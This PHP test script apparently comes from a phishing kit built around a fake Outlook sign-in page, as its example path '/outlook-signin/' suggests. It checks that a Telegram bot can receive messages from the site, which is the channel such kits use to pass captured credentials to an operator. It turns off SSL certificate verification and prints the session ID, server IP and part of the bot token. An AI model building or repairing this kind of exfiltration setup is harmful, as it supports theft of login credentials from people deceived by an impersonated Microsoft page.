<?php
// tg_test.php — Run this file directly in browser to test Telegram connection
// Visit: https://yourdomain.com/outlook-signin/tg_test.php
// DELETE THIS FILE after testing

require 'config.php';

echo "<pre>";
echo "Token: " . substr(TG_TOKEN, 0, 20) . "...\n";
echo "Chat ID: " . TG_CHAT_ID . "\n\n";

// Test 1: Can we reach Telegram API at all?
$ch = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/getMe');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 8,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$res  = curl_exec($ch);
$err  = curl_error($ch);
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "=== TEST 1: getMe ===\n";
echo "HTTP Code: $code\n";
echo "cURL Error: " . ($err ?: 'none') . "\n";
echo "Response: $res\n\n";

// Test 2: Try sending a real message
$ch2 = curl_init('https://api.telegram.org/bot' . TG_TOKEN . '/sendMessage');
curl_setopt_array($ch2, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => [
        'chat_id'    => TG_CHAT_ID,
        'text'       => '✅ TEST MESSAGE from tg_test.php — Telegram connection working!',
        'parse_mode' => 'HTML',
    ],
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 8,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$res2  = curl_exec($ch2);
$err2  = curl_error($ch2);
$code2 = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
curl_close($ch2);

echo "=== TEST 2: sendMessage ===\n";
echo "HTTP Code: $code2\n";
echo "cURL Error: " . ($err2 ?: 'none') . "\n";
echo "Response: $res2\n\n";

$data = json_decode($res2, true);
if (!empty($data['ok'])) {
    echo "✅ SUCCESS — Message sent to Telegram!\n";
} else {
    echo "❌ FAILED — Error: " . ($data['description'] ?? 'unknown') . "\n";
    echo "Possible causes:\n";
    echo "  - Wrong bot token\n";
    echo "  - Wrong chat_id\n";
    echo "  - Bot was never started (/start not sent)\n";
    echo "  - cURL SSL issue\n";
}

echo "\n=== PHP SESSION TEST ===\n";
session_start();
$_SESSION['test'] = 'ok';
echo "Session write: " . ($_SESSION['test'] === 'ok' ? '✅ working' : '❌ failed') . "\n";
echo "Session save path: " . session_save_path() . "\n";
echo "Session ID: " . session_id() . "\n";

echo "\n=== SERVER INFO ===\n";
echo "PHP version: " . PHP_VERSION . "\n";
echo "cURL enabled: " . (function_exists('curl_init') ? '✅ yes' : '❌ no') . "\n";
echo "fastcgi_finish_request: " . (function_exists('fastcgi_finish_request') ? '✅ yes' : '❌ no') . "\n";
echo "Server IP: " . ($_SERVER['SERVER_ADDR'] ?? 'unknown') . "\n";
echo "</pre>";
